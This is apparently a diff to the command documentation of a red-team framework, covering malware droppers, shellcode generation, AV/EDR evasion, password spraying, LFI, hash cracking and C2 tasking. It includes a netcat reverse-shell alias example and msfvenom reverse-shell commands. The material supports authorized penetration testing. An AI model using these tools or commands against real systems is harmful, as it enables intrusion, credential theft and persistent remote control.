+    by modifying the appropriate shell configuration file (`~/.bashrc` or `~/.zshrc`). This ensures 'alterx'
     can be executed from any directory.
 
 4. **Obtain the domain:**
 - Retrieves the URL from the class parameter `self.params["url"]`.
 - Extracts the domain from the URL using `get_domain(url)`.
-- If no domain is provided as an argument in `line`, prompts the user to input a domain, defaulting to 
+- If no domain is provided as an argument in `line`, prompts the user to input a domain, defaulting to
     the previously extracted domain.
 
 5. **Execute 'alterx' on the domain:**
 - Executes the 'alterx' tool on the specified domain via a system command.
-- The subdomain enumeration results are saved to a file in the 'sessions' directory, with the filename 
+- The subdomain enumeration results are saved to a file in the 'sessions' directory, with the filename
     `subdomain_dic_<domain>.txt`.
 
 Parameters:
@@ -8068,14 +8126,14 @@ Returns:
 - None: The function performs its operations but does not return any value.
 
 Dependencies:
-- The function relies on the external tool 'alterx' and assumes the presence of the `is_binary_present()` 
+- The function relies on the external tool 'alterx' and assumes the presence of the `is_binary_present()`
 and `get_domain()` helper functions.
 
 ## allin
 Execute the AlliN.py tool with various scan modes and parameters.
 
-This function prompts the user to choose a scan type (e.g., pscan, sfscan, bakscan), 
-and then asks for the necessary parameters (host, ports, project name, etc.). 
+This function prompts the user to choose a scan type (e.g., pscan, sfscan, bakscan),
+and then asks for the necessary parameters (host, ports, project name, etc.).
 Based on the user's input, it generates the corresponding command and executes it.
 
 :param line: Not used in this implementation.
@@ -8084,9 +8142,9 @@ Based on the user's input, it generates the corresponding command and executes i
 ## dr0p1t
 Execute the Dr0p1t tool to create a stealthy malware dropper.
 
-This function prompts the user to input the necessary parameters for 
-generating a dropper, including the malware URL, persistence options, 
-and additional configurations. Based on the user's input, it constructs 
+This function prompts the user to input the necessary parameters for
+generating a dropper, including the malware URL, persistence options,
+and additional configurations. Based on the user's input, it constructs
 the command and executes it.
 
 :param line: Not used in this implementation.
@@ -8172,7 +8230,7 @@ passtightvnc D7A514D8C556AADE
 Execute the Shadowsocks tool to create a secure tunnel for network traffic.
 
 This function allows the user to specify various parameters for configuring and running the Shadowsocks client
-or server. It handles user input for server address, port, password, encryption method, and other options, 
+or server. It handles user input for server address, port, password, encryption method, and other options,
 constructs the command, and executes it.
 
 :param line: Not used in this implementation.
@@ -8243,7 +8301,7 @@ This function performs the following tasks:
 ## cve
 Search for a CVE using the CIRCL API.
 
-This function sends a GET request to the CIRCL API to retrieve CVE details 
+This function sends a GET request to the CIRCL API to retrieve CVE details
 and prints relevant information to the screen.
 
 :param line: A string containing the CVE ID (optional).
@@ -8359,54 +8417,54 @@ Dependencies:
 ## createjsonmachine
 Create a new JSON payload file based on the template provided in payload.json.
 
-This function reads an existing JSON file named 'payload.json' and 
-allows the user to update specific fields. The following fields can 
+This function reads an existing JSON file named 'payload.json' and
+allows the user to update specific fields. The following fields can
 be modified:
 
-- 'url': The new URL to connect to, which can be entered manually 
+- 'url': The new URL to connect to, which can be entered manually
 or automatically generated based on the input parameter 'line'.
-- 'domain': The new domain associated with the URL, similarly 
+- 'domain': The new domain associated with the URL, similarly
 generated or entered.
-- 'rhost': The new remote host IP address that needs to be specified 
+- 'rhost': The new remote host IP address that needs to be specified
 by the user.
 
-All other fields from the original payload are preserved in the new 
+All other fields from the original payload are preserved in the new
 JSON file, ensuring that no other data is lost or altered.
 
-The newly created JSON payload will be saved in a new file with the 
-format 'payload_<new_name>.json', where <new_name> is derived 
+The newly created JSON payload will be saved in a new file with the
+format 'payload_<new_name>.json', where <new_name> is derived
 from the domain name's subpart.
 
 Parameters:
-line (str): An optional string parameter that, if provided, is used 
-            to generate the new 'url' and 'domain'. If empty, 
-            the user will be prompted to enter values for 'url' 
+line (str): An optional string parameter that, if provided, is used
+            to generate the new 'url' and 'domain'. If empty,
+            the user will be prompted to enter values for 'url'
             and 'domain'.
 
 Returns:
 None
 
 ## xss
-Executes the XSS (Cross-Site Scripting) vulnerability testing procedure 
+Executes the XSS (Cross-Site Scripting) vulnerability testing procedure
 using user-defined parameters and configurations.
 
-This method guides the user through the process of setting up and 
-executing XSS payload injections against a specified target domain. 
-It prompts the user for necessary input, including the XSS payload 
-URL, the target domain, and the request timeout settings. The 
-function ensures that all required inputs are provided and valid 
+This method guides the user through the process of setting up and
+executing XSS payload injections against a specified target domain.
+It prompts the user for necessary input, including the XSS payload
+URL, the target domain, and the request timeout settings. The
+function ensures that all required inputs are provided and valid
 before proceeding with the injection process.
 
 Parameters:
-    line (str): A line of input that may contain additional parameters 
+    line (str): A line of input that may contain additional parameters
                 or commands (not utilized within this method).
 
 Raises:
-    ValueError: If the provided payload URL or target domain is empty, 
-                indicating that these are required for the injection 
+    ValueError: If the provided payload URL or target domain is empty,
+                indicating that these are required for the injection
                 process.
 
-This method leverages user input for flexibility, allowing 
+This method leverages user input for flexibility, allowing
 customized testing scenarios for XSS vulnerabilities.
 
 ## arjun
@@ -8430,8 +8488,8 @@ Parameters:
 ## finger_user_enum
 Executes the `finger-user-enum` tool for enumerating users on the target host.
 
-This function checks if the `finger-user-enum` script is available locally; if not, it clones 
-it from GitHub. It then constructs a command to run the tool with the provided wordlist of 
+This function checks if the `finger-user-enum` script is available locally; if not, it clones
+it from GitHub. It then constructs a command to run the tool with the provided wordlist of
 usernames and target host, and executes the command in the system.
 
 Parameters:
@@ -8444,7 +8502,7 @@ Returns:
 duckyspark Compiles and uploads an .ino sketch to a Digispark device using Arduino CLI and Micronucleus.
 
 duckyspark method checks if Arduino CLI and Micronucleus are installed on the system.
-If they are not available, it installs them. It then compiles a Digispark sketch 
+If they are not available, it installs them. It then compiles a Digispark sketch
 and uploads the generated .hex file to the Digispark device.
 
 The method duckyspark performs the following actions:
@@ -8466,11 +8524,11 @@ Returns:
 Generate usernames using the username-anarchy tool based on user input.
 
 This function prompts the user to either provide names directly or select
-options such as auto-generation based on country datasets, input files, and 
-specific username formats. It then constructs the command for `username-anarchy` 
+options such as auto-generation based on country datasets, input files, and
+specific username formats. It then constructs the command for `username-anarchy`
 and executes it.
 
-:param line: is optional you can pass the name and lastname as an argument example: username_anarchy firstname lastname 
+:param line: is optional you can pass the name and lastname as an argument example: username_anarchy firstname lastname
 :returns: None
 
 ## emp3r0r
@@ -8558,9 +8616,9 @@ Example:
 Create multiple JSON payload files based on a CSV input file from HackerOne.
 
 This function processes a CSV file located in the 'sessions' directory. The CSV file
-must contain information about different assets, including 'identifier', 
-'eligible_for_bounty', and 'eligible_for_submission'. For each asset where 
-both 'eligible_for_bounty' and 'eligible_for_submission' are set to True, 
+must contain information about different assets, including 'identifier',
+'eligible_for_bounty', and 'eligible_for_submission'. For each asset where
+both 'eligible_for_bounty' and 'eligible_for_submission' are set to True,
 a JSON payload file is created using a predefined template.
 
 The CSV must contain the following columns:
@@ -8576,7 +8634,7 @@ For each eligible asset:
 The JSON payload is saved in the format 'payload_<identifier>.json'.
 
 Parameters:
-line (str): An optional string parameter. If provided, it selects the corresponding CSV file 
+line (str): An optional string parameter. If provided, it selects the corresponding CSV file
             in the 'sessions' directory based on the user's input.
 
 Returns:
@@ -8585,12 +8643,12 @@ None
 ## ip2hex
 Convert an IPv4 address into its hexadecimal representation.
 
-This function takes an IPv4 address in standard dotted-decimal format 
-(e.g., '192.168.1.1') and converts each of its four octets into a hexadecimal 
-number. The resulting hexadecimal string is concatenated without separators, 
+This function takes an IPv4 address in standard dotted-decimal format
+(e.g., '192.168.1.1') and converts each of its four octets into a hexadecimal
+number. The resulting hexadecimal string is concatenated without separators,
 providing the full hexadecimal equivalent of the IP address.
 
-The input IP address is expected to be a string in the format 'X.X.X.X', 
+The input IP address is expected to be a string in the format 'X.X.X.X',
 where X is an integer between 0 and 255.
 
 Parameters:
@@ -8600,12 +8658,12 @@ Returns:
 None: The hexadecimal equivalent of the IP address is printed to the console.
 
 ## john2keepas
-List all .kdbx files in the 'sessions' directory, let the user select one, and run the 
-command `sudo keepass2john {user_file} > sessions/hash.txt`. 
+List all .kdbx files in the 'sessions' directory, let the user select one, and run the
+command `sudo keepass2john {user_file} > sessions/hash.txt`.
 If 'sessions/hash.txt' already exists, it will be backed up with a timestamp to avoid overwriting.
 
 Parameters:
-line (str): An optional string parameter. This can be used for any additional input, 
+line (str): An optional string parameter. This can be used for any additional input,
             though it's not needed in this specific command.
 
 Returns:
@@ -8628,13 +8686,13 @@ None
 ## mssqlcli
 Attempts to connect to an MSSQL server using the mssqlclient.py tool with Windows authentication.
 
-The function retrieves the necessary parameters (remote host and domain) from the 
-instance's parameter dictionary. If a credentials file exists in the 'sessions_dir', 
-it reads the file and uses the username/password combinations found there. If the file 
-does not exist, it prompts the user for a username and password. 
+The function retrieves the necessary parameters (remote host and domain) from the
+instance's parameter dictionary. If a credentials file exists in the 'sessions_dir',
+it reads the file and uses the username/password combinations found there. If the file
+does not exist, it prompts the user for a username and password.
 
-The password is copied to the clipboard for convenience. A command is constructed using 
-the mssqlclient.py tool, and it is then executed to initiate the connection to the MSSQL 
+The password is copied to the clipboard for convenience. A command is constructed using
+the mssqlclient.py tool, and it is then executed to initiate the connection to the MSSQL
 server.
 
 Args:
@@ -8646,12 +8704,12 @@ Returns:
 ## getadusers
 Executes the GetADUsers.py script to retrieve Active Directory users.
 
-The function retrieves the necessary parameters (domain controller IP and domain) from the 
-instance's parameter dictionary. If a credentials file exists in the 'sessions_dir', 
-it reads the file and uses the username/password combinations found there. If the file 
+The function retrieves the necessary parameters (domain controller IP and domain) from the
+instance's parameter dictionary. If a credentials file exists in the 'sessions_dir',
+it reads the file and uses the username/password combinations found there. If the file
 does not exist, it prompts the user for a username and password.
 
-The password is copied to the clipboard for convenience. A command is constructed using 
+The password is copied to the clipboard for convenience. A command is constructed using
 the GetADUsers.py tool, and it is then executed to enumerate Active Directory users.
 
 Args:
@@ -8974,7 +9032,7 @@ None
 Converts shellcode to SYLK format and saves the result to a file.
 
 This function reads the provided shellcode, or retrieves it from a default
-binary source if not supplied. The shellcode is then converted to SYLK 
+binary source if not supplied. The shellcode is then converted to SYLK
 format and saved in the `sessions/shellcode.sylk` file.
 
 PoC Python code to create a SYLK file with Excel4 shellcode loader.
@@ -8987,15 +9045,15 @@ Or as Adam Chester would put it: "RWX for this POC, because... yolo"
 Background details: https://outflank.nl/blog/2019/10/30/abusing-the-sylk-file-format/
 
 Args:
-    line (str): The input shellcode string. If empty or None, the function 
+    line (str): The input shellcode string. If empty or None, the function
                 attempts to load shellcode from a predefined source.
 
 Returns:
-    None: The function writes the SYLK shellcode to a file and prints it 
+    None: The function writes the SYLK shellcode to a file and prints it
     out, but does not return any value.
 
 Raises:
-    FileNotFoundError: If no shellcode is found when trying to load it from 
+    FileNotFoundError: If no shellcode is found when trying to load it from
                     the default source.
 
 ## magicrecon
@@ -9130,12 +9188,12 @@ Example:
     serveralive2
 
 ## john2zip
-List all .zip files in the 'sessions' directory, let the user select one, and run the command 
-`zip2john {selected_file} > sessions/hash.txt`. 
+List all .zip files in the 'sessions' directory, let the user select one, and run the command
+`zip2john {selected_file} > sessions/hash.txt`.
 Then, run John the Ripper to crack the hash using the RockYou wordlist with multiple forks.
 
 Parameters:
-line (str): An optional string parameter. This can be used for any additional input, though 
+line (str): An optional string parameter. This can be used for any additional input, though
             it's not needed in this specific command.
 
 Returns:
@@ -9144,14 +9202,14 @@ None
 ## createusers_and_hashs
 Command createusers_and_hashs: Extracts usernames and hashes from a dump file.
 
-This function opens a nano editor for the user to input the contents of a 
+This function opens a nano editor for the user to input the contents of a
 file in the format:
 
     username:UID:LM_HASH:NT_HASH:::
 
 Once the data is entered and saved, the function generates:
 1. A file named `usernames_{rhost}.txt` containing all usernames.
-2. Individual files named `hash_{username}.txt` for each user, containing 
+2. Individual files named `hash_{username}.txt` for each user, containing
 the user's LM and NT hash in the format `LM_HASH:NT_HASH`.
 
 Args:
@@ -9269,7 +9327,7 @@ Extracts open ports and IP address information from a specified file.
 
 This function performs the following actions:
 1. Reads the specified file to find open ports.
-2. If not port pass as an argument, Extracts the first unique IP address found in the file. 
+2. If not port pass as an argument, Extracts the first unique IP address found in the file.
 3. Prints the extracted information to the console.
 
 Parameters:
@@ -9282,7 +9340,7 @@ None
 Schedules a command to run at a specified time.
 
 This function allows users to schedule a command to execute at a specific hour and minute.
-If the specified time has already passed for the current day, the command will be scheduled 
+If the specified time has already passed for the current day, the command will be scheduled
 to run the following day.
 
 Usage:
@@ -9299,7 +9357,7 @@ Executes the PEzor tool to pack executables or shellcode with custom configurati
 
 This function enables the user to construct commands for PEzor with various options.
 By default, parameters are prompted to ensure successful execution without failure due to
-missing values. It supports both executable and shellcode packing with the ability to 
+missing values. It supports both executable and shellcode packing with the ability to
 select from a range of PEzor flags to create the desired payload.
 
 Functionalities of the function include:
@@ -9404,7 +9462,7 @@ This function performs the following actions:
 1. Checks if Scavenger is installed; if not, it clones the repository and installs dependencies.
 2. If the line argument is "pass", it searches for credential files matching `credentials*.txt`,
    prompts the user to select one, and executes Scavenger using the chosen credentials on a single target IP.
-3. If the line argument is "targets", it prompts for an IP list file (`iplist`) and uses Scavenger with 
+3. If the line argument is "targets", it prompts for an IP list file (`iplist`) and uses Scavenger with
    credentials from a selected file on multiple target IPs with the `--overwrite` option.
 4. If line does not match "pass" or "targets", it displays an error message with usage instructions.
 
@@ -9452,6 +9510,9 @@ line (str): Command argument specifying the authentication mode.
 
 Returns:
 None
+
+## certipy_ad
+No description available.
 
 ## certipy
 Executes the Certipy tool to interact with Active Directory Certificate Services.
@@ -9513,13 +9574,13 @@ Returns:
 None
 
 ## ad_ldap_enum
-Executes ad-ldap-enum to enumerate Active Directory objects (users, groups, computers) 
+Executes ad-ldap-enum to enumerate Active Directory objects (users, groups, computers)
 through LDAP, collecting extended information on group memberships and additional AD details.
 
-This function enables the enumeration of Active Directory users, groups, and computers 
-by executing LDAP queries on a specified domain controller. The command constructed allows 
-password or Pass-the-Hash authentication, supports SSL/TLS, and IPv4/IPv6 connections, 
-and outputs data into CSV files detailing domain group memberships and extended user/computer 
+This function enables the enumeration of Active Directory users, groups, and computers
+by executing LDAP queries on a specified domain controller. The command constructed allows
+password or Pass-the-Hash authentication, supports SSL/TLS, and IPv4/IPv6 connections,
+and outputs data into CSV files detailing domain group memberships and extended user/computer
 information.
 
 Functionalities include:
@@ -9543,7 +9604,7 @@ Unzips a specified file from the sessions directory.
 This function attempts to locate and unzip a file in the sessions directory.
 If a filename is provided as `line`, it will use that; otherwise, it will attempt
 to retrieve a zip file name based on existing zip files in the user's dictionary.
-If the zip file is not found or does not exist in the sessions path, it prints 
+If the zip file is not found or does not exist in the sessions path, it prints
 an error message.
 
 Steps of execution:
@@ -9554,7 +9615,7 @@ Steps of execution:
 Usage example:
     unzip filename.zip
 
-:param line: The zip filename to be extracted. If empty, a zip file will be selected 
+:param line: The zip filename to be extracted. If empty, a zip file will be selected
             automatically if available.
 :return: None
 
@@ -9569,7 +9630,7 @@ This function performs the following actions:
 
 Parameters:
 line (str): Command argument specifying the parameters for the reGeorg execution.
-            - The expected format is: "<port> <url>", where <port> is the listening port and <url> is the URL 
+            - The expected format is: "<port> <url>", where <port> is the listening port and <url> is the URL
             containing the tunnel script.
 
 Returns:
@@ -9601,7 +9662,7 @@ Executes the pyWhisker tool for manipulating the msDS-KeyCredentialLink attribut
 
 This function performs the following actions:
 1. Checks if pyWhisker is installed; if not, it clones the repository.
-2. Executes various actions on the msDS-KeyCredentialLink attribute, allowing actions like listing, adding, 
+2. Executes various actions on the msDS-KeyCredentialLink attribute, allowing actions like listing, adding,
 spraying, removing, clearing, exporting, or importing KeyCredentials for a specified target user or computer.
 
 The command accepts different authentication options:
@@ -9870,12 +9931,12 @@ None
         Some WAF can be bypassed with the use of unicode characters.
 
         Generate an obfuscated payload, encode it in base64, and append the SSH public key to the authorized_keys file.
-        
+
         Args:
             ip_address (str): The IP address for the reverse shell connection.
             port (int): The port for the reverse shell connection.
             ssh_public_key (str): The SSH public key to add to authorized_keys.
-        
+
         Returns:
             str: The base64-encoded obfuscated payload.
 
@@ -9943,25 +10004,25 @@ Returns:
 None
 
 ## lfi
-Exploits a potential Local File Inclusion (LFI) vulnerability by crafting 
+Exploits a potential Local File Inclusion (LFI) vulnerability by crafting
 and sending HTTP GET requests to a specified URL.
 
-The user can specify the target URL directly via the `line` parameter or 
-provide it interactively. If no URL is provided, the method uses a default 
-value stored in `self.params["url"]`. Users are then prompted to specify 
+The user can specify the target URL directly via the `line` parameter or
+provide it interactively. If no URL is provided, the method uses a default
+value stored in `self.params["url"]`. Users are then prompted to specify
 the file to retrieve from the server, defaulting to `/etc/passwd`.
 
 Args:
-    line (str): Optional URL input provided directly in the command line. 
-                If not supplied, a default URL from `self.params["url"]` 
+    line (str): Optional URL input provided directly in the command line.
+                If not supplied, a default URL from `self.params["url"]`
                 will be used.
 
 Behavior:
-    - Continuously prompts the user to specify a file to fetch via the 
+    - Continuously prompts the user to specify a file to fetch via the
     target LFI vulnerability.
-    - Sends a GET request to the constructed URL and prints the server's 
+    - Sends a GET request to the constructed URL and prints the server's
     response to the console.
-    - Allows users to inspect different files on the target server by 
+    - Allows users to inspect different files on the target server by
     modifying the file path interactively.
 
 ## greatSCT
@@ -10003,7 +10064,7 @@ Returns:
 None
 
 ## setoolKits
-Executes the SEToolKit workflow to generate a Meterpreter payload 
+Executes the SEToolKit workflow to generate a Meterpreter payload
 and configure the multi-handler using LHOST and LPORT from self.params.
 
 Usage:
@@ -10053,14 +10114,14 @@ None
 Executes Osmedeus scans with guided input for various scanning scenarios.
 
 This function performs the following actions:
-1. Verifies the presence of Osmedeus; if not installed, it clones the repository 
+1. Verifies the presence of Osmedeus; if not installed, it clones the repository
 and installs the required dependencies.
-2. Guides the user through selecting the type of scan, target, and any additional 
+2. Guides the user through selecting the type of scan, target, and any additional
 parameters needed for the scan.
 3. Constructs and executes the appropriate Osmedeus command.
 
 Parameters:
-line (str): Command-line arguments for the tool. If not provided, interactive 
+line (str): Command-line arguments for the tool. If not provided, interactive
             input will be used.
 
 Returns:
@@ -10117,6 +10178,15 @@ line (str): Command-line arguments (not used in this function).
 Returns:
 None
 
+## attack_plan
+Executes a multi-step APT simulation plan based on Atomic Red Team test IDs.
+
+Parameters:
+line (str) optional: Path to the YAML plan file.
+
+Returns:
+None
+
 ## mitre_test
 Interacts with the MITRE ATT&CK framework using the STIX 2.0 format.
 
@@ -10132,6 +10202,43 @@ Usage:
     mitre_test tactic <name>    # Lists techniques for a specific tactic
     mitre_test technique <id>   # Shows details of a specific technique
 
+## generate_playbook
+Generates a playbook that integrates Atomic Red Team tests and MITRE ATT&CK techniques.
+
+This function creates a playbook by combining tests from the Atomic Red Team repository
+and techniques from the MITRE ATT&CK framework. The playbook includes detailed information
+about each test and technique, making it a comprehensive resource for emulating adversary
+behaviors.
+
+Parameters:
+line (str): Command-line arguments for specifying the playbook name and optional filters.
+            The filters can be applied to various attributes of the tests and techniques,
+            including but not limited to:
+            - name: Filter by the name of the test or technique.
+            - description: Filter by keywords in the description of the test or technique.
+            - mitre_id: Filter by the MITRE ATT&CK technique ID.
+            - platforms: Filter by the supported platforms (e.g., windows, linux, macos).
+            - tactic: Filter by the MITRE ATT&CK tactic associated with the technique.
+            - data_sources: Filter by the data sources mentioned in the technique.
+            - defensive_measures: Filter by the defensive measures mentioned in the technique.
+            - examples: Filter by examples mentioned in the technique.
+            - references: Filter by references or URLs mentioned in the technique.
+            - related_techniques: Filter by related techniques mentioned in the technique.
+            - mitigations: Filter by mitigations mentioned in the technique.
+
+Returns:
+None
+
+Example Usage:
+do_generate_playbook("ExamplePlaybook persistence lateral_movement windows")
+This command will generate a playbook named "ExamplePlaybook" that includes tests and
+techniques related to "persistence", "lateral_movement", and the "windows" platform.
+
+## my_playbook
+Generates a playbook from your custom technique database.
+Usage: my_playbook <name> [filter]
+Example: my_playbook KerberosAttack password spray
+
 ## bbot
 Executes a BBOT scan to perform various reconnaissance tasks.
 
@@ -10144,7 +10251,7 @@ Parameters:
 
 Usage:
     bbot -t <target> -p <preset>
-    
+
     Examples:
         bbot -t evilcorp.com -p subdomain-enum
         bbot -t evilcorp.com -p email-enum spider web-basic
@@ -10281,8 +10388,8 @@ None
 ## eyewitness_py
 Automates EyeWitness installation and execution without requiring user input.
 
-This function installs EyeWitness if it is not already available, uses a default input file 
-(`urls.txt`), and applies standard configurations to execute a web enumeration task 
+This function installs EyeWitness if it is not already available, uses a default input file
+(`urls.txt`), and applies standard configurations to execute a web enumeration task
 automatically. No arguments or manual intervention are needed from the user.
 
 Behavior:
@@ -10313,8 +10420,8 @@ Usage:
 ## recon
 Performs reconnaissance on a specified domain using crt.sh (the target must be visible on internet), pup, httprobe, and EyeWitness.
 
-This function automates the process of gathering subdomains for a given domain, verifying 
-their reachability, and generating a report using the EyeWitness tool. 
+This function automates the process of gathering subdomains for a given domain, verifying
+their reachability, and generating a report using the EyeWitness tool.
 
 Workflow:
     1. Determines the target domain from the `line` argument or defaults to `self.params["domain"]`.
@@ -10342,12 +10449,12 @@ Raises:
     None. Errors in execution will be logged or printed as part of the command output.
 
 ## digdug
-Executes Dig Dug to inflate the size of an executable file, leveraging pre-configured settings 
+Executes Dig Dug to inflate the size of an executable file, leveraging pre-configured settings
 and interactive input for minimal user effort.
 
-This function integrates with the Dig Dug tool to increase an executable's size by appending 
-dictionary words. It automates repository setup, selects the input file from user prompts or defaults, 
-and uses sensible configurations to execute the inflation process. Dig Dug is particularly useful 
+This function integrates with the Dig Dug tool to increase an executable's size by appending
+dictionary words. It automates repository setup, selects the input file from user prompts or defaults,
+and uses sensible configurations to execute the inflation process. Dig Dug is particularly useful
 for evading AV/EDR detections by exceeding size thresholds for analysis.
 
 Behavior:
@@ -10374,8 +10481,8 @@ Examples:
 ## adsso_spray
 Performs a password spray attack on Azure Active Directory Seamless Single Sign-On (SSO) using a specified list of users.
 
-This function automates the process of spraying a given password across multiple user accounts in a target domain. It utilizes 
-a user list in the form of a text file, targeting Azure AD Seamless SSO endpoints. The results are processed and saved to 
+This function automates the process of spraying a given password across multiple user accounts in a target domain. It utilizes
+a user list in the form of a text file, targeting Azure AD Seamless SSO endpoints. The results are processed and saved to
 a specified output file, providing insights into which accounts were successful or failed during the attack.
 
 Requirements:
@@ -10550,7 +10657,7 @@ None
 Synchronizes the local "sessions" directory to a remote host using rsync, leveraging sshpass for automated authentication.
 
 Steps:
-    1. Verifies if the credentials file exists in the "sessions" directory. 
+    1. Verifies if the credentials file exists in the "sessions" directory.
     If not, prompts the user for a username and password.
     2. Reads the credentials file if it exists and extracts the username and password.
     3. Constructs an rsync command to deploy the "sessions" directory to the remote host.
@@ -10575,7 +10682,7 @@ Raises:
     - FileNotFoundError: If the "sessions" directory does not exist.
 
 Note:
-    - The `credentials.txt` file, if present, should have credentials in the format `username:password` 
+    - The `credentials.txt` file, if present, should have credentials in the format `username:password`
     on the first line.
 
 Returns:
@@ -10723,7 +10830,15 @@ Trasnform file .exe into binary file.
 Args:
     line (str): Ruta del archivo ejecutable .exe.
 
-Return shellcode.bin file in sessions directory    
+Return shellcode.bin file in sessions directory
+
+## exe2donutbin
+Trasnform file .exe into donut binary file.
+
+Args:
+    line (str): path to the .exe.
+
+Return shellcode.bin file in sessions directory
 
 ## atomic_lazyown
 Genera y ejecuta pruebas de Atomic Red Team usando el C2.
@@ -10744,13 +10859,16 @@ Returns:
 None
 
 ## upload_c2
-Exec command in the client using the C2.
+upload command in the client using the C2 to upload a file
 
 Parameters:
 command (str): client_id [optional], Command to exec.
 
 Returns:
 None
+
+## complete_upload_c2
+Autocomplete implant names from implant_config_*.json files in sessions/ directory
 
 ## download_file_from_c2
 Descarga un archivo desde el C2.
@@ -10771,6 +10889,9 @@ line (str): Command input in the format "client_id file_name".
 Returns:
 None
 
+## complete_download_c2
+Autocomplete implant names from implant_config_*.json files in sessions/ directory
+
 ## issue_command_to_c2
 Ejecuta un comando en el cliente usando el C2.
 
@@ -10782,13 +10903,16 @@ Returns:
 None
 
 ## issue_command_to_c2
-Exec command in the client using the C2.
+Exec command in the client using the C2. download: command you must put the file in sessions/temp_upload or use download_c2 command
 
 Parameters:
 command (str): client_id [optional], Command to exec.
 
 Returns:
 None
+
+## complete_issue_command_to_c2
+Autocomplete: 1st arg = implant name, 2nd arg = beacon command (with : if needed)
 
 ## ofuscatorps1
 Obfuscates a PowerShell script using various techniques.
@@ -11264,8 +11388,8 @@ Returns:
 LazyOwn RedTeam Adversary Emulator, you can configure your own adversaries in adversary.json
 
 Parameters:
-    line (str): The command line input, 
-    first argument optional is the id of Adversary, 
+    line (str): The command line input,
+    first argument optional is the id of Adversary,
     the second optional argument is if the adversary run locally (l), remote (r), or doesn't run (n)
 
 Example: adversary 1 r
@@ -11285,7 +11409,7 @@ Get list de supported acctions.
 ## path2hex
 Convert a binary path to x64 little-endian hex code for shellcode injection.
 
-Generates an 8-byte aligned hex string padded with '/' for direct use in 
+Generates an 8-byte aligned hex string padded with '/' for direct use in
 x64 assembly syscall examples. Output format mimics: 0x68732f2f6e69622f ('/bin/sh').
 
 License: GPL v3 (https://www.gnu.org/licenses/gpl-3.0.html)
@@ -11326,10 +11450,177 @@ Examples:
     Output:
         db 0x48,0x31,0xc9,0x48,0x81,0xe9,0xf6
 
+## ai_playbook
+Generates an offensive playbook using:
+1. Nmap scan results (CSV)
+2. Custom knowledge base (JSON)
+3. Local LLM analysis (Ollama)
+
+Usage: ai_playbook <csv_file> [playbook_name] [model_name]
+Example: ai_playbook nmap_results.csv ScepterAttack llama3
+
+## _create_strict_yaml_prompt
+Create a prompt that strictly enforces YAML response format without any narrative text
+
+## create_synthetic
+Create a basic synthetic playbook from Nmap CSV when LLM fails.
+
+Usage: create_synthetic <csv_file> [playbook_name]
+Example: create_synthetic nmap_results.csv SyntheticPlaybook
+
+## extract_yaml
+Extract YAML from an existing debug file and try to create a playbook.
+
+Usage: extract_yaml <debug_file> [playbook_name]
+Example: extract_yaml debug_AutoGeneratedPlaybook.txt MyPlaybook
+
+## img2vid
+Generates an MP4 video from PNG images found in the sessions/captured_images directory.
+This images are generated by the ofensive js code in the decoy site (When the blueteam try to visit our c2 and success login).
+
+The images are expected to have filenames in the format: capture_YYYYMMDD_HHMMSS.png.
+The video will be created in the current working directory as 'output.mp4'.
+Requires ffmpeg to be installed and accessible in the system's PATH.
+
+## convert_remcomsvc_from_file
+Converts the Python REMCOMSVC byte string from remcomsvc.py to Golang byte slice format, prints a sample, and saves it to sessions/remcomsvc.go. see lazyaddon GoPEInjection
+Usage: convert_remcomsvc_from_file
+Return: Converts the Python REMCOMSVC byte string from remcomsvc.py to Golang byte slice format, prints a sample, and saves it to sessions/remcomsvc.go.
+
+## process_scans
+Processes CSV files with scan results and vulnerability data to generate a Shodan-like JSON database.
+
+Args:
+    arg (Namespace): Arguments parsed by cmd2. Includes:
+        directory (str, positional): The directory containing the CSV files.
+
+Returns:
+    None
+
+Output:
+    A JSON file named 'surface_attack.json' in the specified directory containing the processed data.
+
+## process_scan_csv
+Processes a single scan CSV file.
+
+## process_vuln_csv
+Processes a single vulnerability CSV file.
+
+## adversary_yaml
+Execute adversary from YAML in lazyadversaries/*.yaml
+Syntax: adversary [id] [l|r|n]
+
+## _load_adversaries
+No description available.
+
+## _parse_adversary_args
+No description available.
+
+## _patch_template_if_needed
+No description available.
+
+## _build_command_stack
+No description available.
+
+## _display_adversary_info
+No description available.
+
+## _execute_commands
+No description available.
+
+## msfshellcoder
+Generate shellcode in C format using msfvenom for either a custom command or a reverse shell payload.
+This command supports both direct argument input and interactive mode. It uses self.params for default
+values (lhost, lport, etc). Output is saved to sessions/ as a .txt file in C array format.
+Args:
+    --payload (-p): MSF payload (e.g., windows/x64/meterpreter/reverse_tcp).
+    --command (-c): Custom command to encode into shellcode (e.g., 'whoami').
+    --lhost (-H): Local IP for reverse shells.
+    --lport (-P): Local port for reverse shells.
+    --os (-o): Target OS: 'windows' or 'linux'.
+    --arch: Target architecture: 'x86' or 'x64' (default: x64).
+Outputs:
+    Saves shellcode to ./sessions/shellcode_*.txt in C format.
+    Uses self.cmd() to run system commands and self.display_toastr() for UI feedback.
+Examples:
+    msfshellcoder -c "calc.exe" --os windows
+    msfshellcoder -p linux/x64/shell_reverse_tcp -H 10.0.0.5 -P 4444
+    msfshellcoder  # Launch interactive mode
+
+## pop
+Open a centered popup in the current tmux session to execute a shell command.
+
+If no command is provided via argument, prompts the user interactively.
+The popup remains open after command execution and waits for user acknowledgment
+via pressing ENTER, avoiding premature closure without requiring fixed sleep delays.
+
+Requirements:
+- Must be run inside an active tmux session (TMUX environment variable set).
+- Tmux server must be running.
+
+The command is executed in a bash shell within the popup. If tmux is not available
+or the environment is invalid, an error message is displayed and execution aborts.
+
+Args:
+    line (str): The command to execute in the popup. If empty, prompts user input.
+
+## addalias
+Add a new alias with support for placeholders like {rhost}, {lhost}, {lport}, etc.
+
+Usage:
+    addalias <name> <command>
+
+Example:
+    addalias myrev sh rlwrap nc {rhost} {lport} -e bash
+    addalias scan run_script "lazyscripts/nmap_scan.ls {rhost}"
+
+## listaliases
+List all available aliases.
+
+## add2find
+Add a new custom command to the 'find' system, saved in user_commands.json.
+
+Usage: add2find
+You will be prompted for:
+- Alias (descriptive name)
+- Command (the actual shell/command to execute)
+
+Example:
+Alias: LIN My Custom Recon
+Command: find / -name "*.log" 2>/dev/null
+
+The command will be available in 'find' immediately and persist across sessions.
+
+## rmfromfind
+Remove a custom command by index (as shown in 'find').
+
+Only removes user-added commands (not defaults).
+
+## aes_pe
+Encrypt with AES and random key to PE EXE file, to usage with loaders.
+
+Usage: aes_pe
+You will be prompted for:
+- the PE Exe file (descriptive name)
+
+Example:
+aes_pe
+
+The files key.bin and cipher.bin will be available in 'sessions' immediately and persist across the web server.
+
+## ai_toggle
